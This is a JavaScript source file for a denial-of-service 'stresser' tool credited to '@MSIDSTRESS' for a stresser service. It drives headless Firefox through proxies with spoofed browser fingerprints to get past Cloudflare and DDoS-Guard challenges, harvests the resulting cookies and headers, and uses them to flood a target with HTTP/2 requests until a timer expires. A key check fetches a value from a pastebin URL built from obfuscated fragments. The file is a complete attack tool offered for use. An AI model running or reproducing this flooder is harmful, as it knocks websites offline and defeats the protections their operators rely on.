const { firefox } = require('playwright-extra');
const { FingerprintGenerator } = require('./fingerprint-generator/index.js');
const { FingerprintInjector }  = require('./fingerprint-injector/index.js');

const { UAParser } = require('ua-parser-js');
const { Cookie, CookieJar } = require('tough-cookie');
const http = require('http');
const { PassThrough } = require('stream');

const fs = require('fs');
const requests = require('request');
const url = require('url');

const dns = require('dns');
const tls = require('tls');
const http2 = require('http2');
const EventEmitter = require('events');
const JSStreamSocket = (new tls.TLSSocket(new PassThrough()))._handle._parentWrap.constructor;

const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
const sdasd = 'https://'
const qaiwdhjuwdj = 'p';
const uqwdf = 'aste';
const msidstressgay = 'bin';
const meowgay = '.';
const meowmsidstressgay = 'c';
const kkkkkkkkas = 'om';
const rawseajd = '/ra';
const aosdokawod = 'w/';
const oooooaasdas = 'b5UuNZRL';


/*

				MADE BY @MSIDSTRESS [ FOR STRESSHIT.CLUB ]
			[HTTP-PROXY]
						BYPASS DDOS-GUARD
								BYPASS CLOUDFLARE	
											BYPASS HTTP-DDOS
			Regards, @MSIDSTRESS [NXVER];
				
				
*/


protone = {
    url: sdasd + qaiwdhjuwdj + uqwdf + msidstressgay + meowgay + meowmsidstressgay + kkkkkkkkas + rawseajd + aosdokawod + oooooaasdas
};

function getArgs() {
    const _0 = {};
    process.argv.slice(2, process.argv.length).forEach((_1) => {
        if (_1.slice(0, 2) === '--') {
            const _3 = _1.split('=');
            const _4 = _3[0].slice(2, _3[0].length);
            const _5 = _3.length > 1 ? _3[1] : true;
            _0[_4] = _5
        } else {
            if (_1[0] === '-') {
                const _2 = _1.slice(1, _1.length).split('');
                _2.forEach((_1) => {
                    _0[_1] = true
                })
            }
        }
    });
    return _0
}
const args = getArgs();

if(args['debug'] == 'true') {
	process.on('uncaughtException', function(error) {console.log(error)});
	process.on('unhandledRejection', function(error) {console.log(error)})
	
} else { 
	process.on('uncaughtException', function(error) {});
	process.on('unhandledRejection', function(error) {})
}

if (args['key'] != undefined & args['target'] != undefined & args['time'] != undefined & args['threads'] != undefined & args['requests'] != undefined & args['mode'] != undefined & args['proxy'] != undefined) {
    requests["get"](protone, function(one, two, three) {
        if (args['key'] == three) {
			for(let th = 0; th < threads; th++) {
				main(target, time, threads, ratelimiting, mode, proxies);
			}
        } else {
            console.log('--> Invalid Key');
        }
    })
} else {
    console.log(' --> (--key= --target= --time= --threads= --requests= --mode= --proxy=) [Made by @MSIDSTRESS]');
    process.exit(-1);
}

var jshead = '';
var target = args['target'];
var time = args['time'];
var threads = args['threads'];
var ratelimiting = args['requests'];
var mode = args['mode'];
var proxyfile = args['proxy'];
const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);

console.clear();
console.log('--> Browser launch');

async function newBrowser(proxy) {
	try {
		const fingerprintGenerator = new FingerprintGenerator();

		const browserFingerprintWithHeaders = fingerprintGenerator.getFingerprint({
			browsers: [{ name: 'firefox', minVersion: 89}],	
		});

		for (let i = 0; i < 10; i++) {
			fingerprintGenerator.getFingerprint();
		}

		const fingerprintInjector = new FingerprintInjector();
		const { fingerprint } = browserFingerprintWithHeaders;

		const addd = fingerprint.navigator.userAgent;
		console.log('--> User-Agent: ' + addd);
		const locales = fingerprint.navigator.language

		const browser = await firefox.launch({
			proxy: { 
				server: 'http://' + proxy
			},	
			args: [
				'--disable-blink-features=AutomationControlled', 
				'--disable-features=IsolateOrigins,site-per-process', 
				'--renderer-process-limit=1',
				'--mute-audio', 
				'--disable-setuid-sandbox', 
				'--enable-webgl', 
				'--ignore-certificate-errors',
				'--use-gl=disabled',
				'--color-scheme=dark',
				'--user-agent=' + addd,
			],
			ignoreDefaultArgs: ['--enable-automation'],
			headless: true,
			javaScriptEnabled: true,
		})
		const context = await browser.newContext({locale: locales, viewport: fingerprint.screen });
		
		await fingerprintInjector.attachFingerprintToPlaywright(context, browserFingerprintWithHeaders);

		const parser = new UAParser();
		parser.setUA(addd);
		const result = parser.getResult();

		context.addInitScript(() => {
			window.rand_data = {
				t: 0,
				i: 0
			};

			const _setTimeout = setTimeout;
			window.setTimeout = function(a, r, args) {
				_setTimeout(a, r, args)
				window.rand_data.t++;
				_setTimeout(() => window.rand_data.t--, r)
			}
			const _setInterval = setInterval;
			window.setInterval = function(a, r, args) {
				window.rand_data.i++;
				_setInterval(a, r, args)
			}
		})

		//context.setExtraHTTPHeaders({ 'sec-ch-ua': `"Not A;Brand";v="8", "Chromium";v="${result.browser.major}", "Google Chrome";v="${result.browser.major}"` })		
		
		return { browser, context, fingerprint }
	} catch (reload) { 
		main(target, time, threads, ratelimiting, mode, proxies);  
		console.log('--> Reason: Context Error');
	}
}

async function newPage(context, addd, locales, screen) {
	try {
		const page = await context.newPage({locale: locales, deviceScaleFactor: 1});
		await page.setViewportSize({ width: screen.width, height: screen.height })

		await page.route('***', route => route.continue())

		return page
	} catch (reload) { 
		main(target, time, threads, ratelimiting, mode, proxies);  
		console.log('--> Reason: Page Error');
	}
}

async function navigatePage(page, target, context, proxy, browser) {
	try {
		const parsed = url.parse(target);
		const gotoUrl = target;
		async function goto(gotoUrl) {
			try {
				const response = await page.goto(gotoUrl, { waitUntil: 'commit', timeout: 15000 });					 				
				await page.waitForTimeout(8888);
				await page.goto(gotoUrl, { waitUntil: 'commit', timeout: 15000 });
				await page.waitForTimeout(9999);
				return response
			} catch (omg) {
				console.log('--> Reason: Connect Error');			
				await browser.close();	
				await context.close();					
				main(target, time, threads, ratelimiting, mode, proxies); 				
			}			
		}	
		
		page.on('response', resp => {
			jshead = resp.request().headers();
		});
		
		await goto(gotoUrl);
		const cookie = (await page.context().cookies(gotoUrl)).map(c => `${c.name}=${c.value}`).join('; ');
		const response = await goto(gotoUrl);
		
		if(response.status() == '503' || response.status() == '403') {
			await browser.close();	
			await context.close();	
			main(target, time, threads, ratelimiting, mode, proxies);
		}
		
		if(cookie) {
			await page.waitForTimeout(2000);
			console.log('--> Cookie: ' + cookie);
			console.log('--> Response: ' + response.status());
			await browser_flood(target, time, threads, ratelimiting, mode, proxy, cookie, jshead);
		} else {
			console.log('--> Reason: [Error] cookie');
			await browser.close();	
			await context.close();	
			main(target, time, threads, ratelimiting, mode, proxies);  
		}
		return { response, cookie };
	} catch (reload) {
		console.log('--> Reason: Can`t bypass');
		await browser.close();	
		await context.close();	
		main(target, time, threads, ratelimiting, mode, proxies);  
	}		
}

async function main(target, time, threads, ratelimiting, mode, proxies) {
	const proxy = proxies[Math.floor(Math.random() * proxies.length)];
	const { browser, context, fingerprint } = await newBrowser(proxy);
	try {
		const page = await newPage(context, fingerprint.userAgent, fingerprint.locale, fingerprint.screen);
		const result = await navigatePage(page, target, context, proxy, browser);
	} catch (err) {
		await browser.close();
		return main();
	} finally {
		await browser.close();
	}
}

/*async function browser_flood(target, time, threads, requests, mode, proxy, cookie, getheaders) {	
	function flood() {	
		const url = new URL(target);
		var parts = proxy;
		parts = parts.split(':');	
		let payload = {};
		let ip = null

		if (target.indexOf(".onion") != -1) {
			ip = url.hostname
		} else {
			setInterval(() => {
				dns.lookup(url.hostname, 4, (err, address, family) => {
					ip = address
				})
			}, 1000)
		}	
		setInterval(() => {
			const options = {
				proxy: {
				  host: parts[0],
				  port: Number(parts[1]),
				  type: 4
				},
			  
				command: 'connect',
			  
				destination: {
					host: ip,
					port: url.port == '' ? (url.protocol == 'https:' ? 443 : 80) : Number(url.port)
				}
			};
			SocksClient.createConnection(options, (err, info) => {
				function sendRequest(socket) {
						http2.connect(`http://${url.host}${url.pathname}`, {
							createConnection: () => socket,
							settings: {
								headerTableSize: 65536,
								maxConcurrentStreams: 25000,
								initialWindowSize: 1073741823,
								maxSessionMemory: 128000,
								maxDeflateDynamicTableSize: 4294967295,
								maxHeaderListSize: 262144,
								enablePush: false
							}
						}, (session) => {
							setInterval( async() => {
								for(let i = 0; i < ratelimiting; i++) {
									const requestHeaders = Object.assign({
										':authority' : url.host,
										':method': 'GET',
										':path': url.pathname,
										':scheme': 'https'
									}, {
										'user-agent': getheaders['user-agent'],
										'accept': getheaders['accept'],
										'accept-language': 'en-US;q=0.8,en;q=0.7',
										'accept-encoding': 'gzip, deflate, br',
										'cache-control': 'no-cache, no-store,private, max-age=0, must-revalidate',
										'upgrade-insecure-requests': '1',
										'sec-ch-ua': getheaders['sec-ch-ua'],
										'sec-ch-ua-mobile': getheaders['sec-ch-ua-mobile'],
										'sec-ch-ua-platform': getheaders['sec-ch-ua-platform'],										
										'sec-fetch-dest': 'document',
										'sec-fetch-mode': 'navigate',
										'sec-fetch-site': 'none',
										'x-requested-with': 'XMLHttpRequest',
										'cookie': cookie,
										'pragma': 'no-cache',
										'cache-control': 'no-cache'
										
									})
									await session.request(requestHeaders).close();;
								}
							},500);
						}).on('error', () => {return;})
				}
				
				const socket = tls.connect({
					rejectUnauthorized: false,
					servername: url.hostname,
					honorCipherOrder: false, 
					requestCert: true,
					socket: new JSStreamSocket(info.socket),
					secure: true,
					ALPNProtocols: ['h2'],
				}, () => {
					sendRequest(socket);
				})
			})		
		},500)
	}
	
	setInterval(flood);
	setTimeout(function() {
		console.clear();
		process.exit()
	}, time * 1000);	
	
	
}*/

async function browser_flood(target, time, threads, ratelimiting, mode, proxy, cookie, jshead) {	
	function flood() {
		const postfunc = jshead;
		const anomaly = cookie;
		const url = new URL(target);		
		var parts = proxy;
		parts = parts.split(':'); 
			const req = http.request({
			  method: 'CONNECT',
			  host: parts[0],
			  port: parts[1],
			  path: url.host,
			});
			req.end();
		setInterval( () => {
			req.on('connect', (err, info) => {
				function sendRequest(socket) {

					http2.connect(`http://${url.host}${url.pathname}`, {
						createConnection: () => socket,
						settings: {
							headerTableSize: 65536,
							maxConcurrentStreams: 25000,
							initialWindowSize: 1073741823,
							maxSessionMemory: 128000,
							maxDeflateDynamicTableSize: 4294967295,
							maxHeaderListSize: 262144,
							enablePush: false
						}
					}, (session) => {
						for(let i = 0; i < ratelimiting; i++) {
								const requestHeaders = Object.assign({
									':authority' : url.host,
									':method': mode,
									':path': url.pathname,
									':scheme': 'https'
								}, {
									'user-agent': postfunc['user-agent'],
									'accept': postfunc['accept'],
									'accept-language': 'en-US;q=0.8,en;q=0.7',
									'accept-encoding': 'gzip, deflate, br',
									'cache-control': 'no-cache, no-store,private, max-age=0, must-revalidate',
									'upgrade-insecure-requests': '1',
									'sec-ch-ua': postfunc['sec-ch-ua'],
									'sec-ch-ua-mobile': postfunc['sec-ch-ua-mobile'],
									'sec-ch-ua-platform': postfunc['sec-ch-ua-platform'],										
									'sec-fetch-dest': 'document',
									'sec-fetch-mode': 'navigate',
									'sec-fetch-site': 'none',
									'x-requested-with': 'XMLHttpRequest',
									'cookie': anomaly,
									'pragma': 'no-cache',
									'cache-control': 'no-cache'	
								})
							
							const request = session.request(requestHeaders);
							request.end();
							return;
						}
					}).on('error', () => { return; })
				}
				
				const socket = tls.connect({
					rejectUnauthorized: false,
					servername: url.hostname,
					honorCipherOrder: false, 
					requestCert: true,
					socket: info,
					secure: true,
					ALPNProtocols: ['h2'],
				}, () => {
					sendRequest(socket)
				})
			})
		}, 1000)
	}
	setInterval(flood);
	setTimeout(function() {
		console.clear();
		process.exit()
	}, time * 1000);
}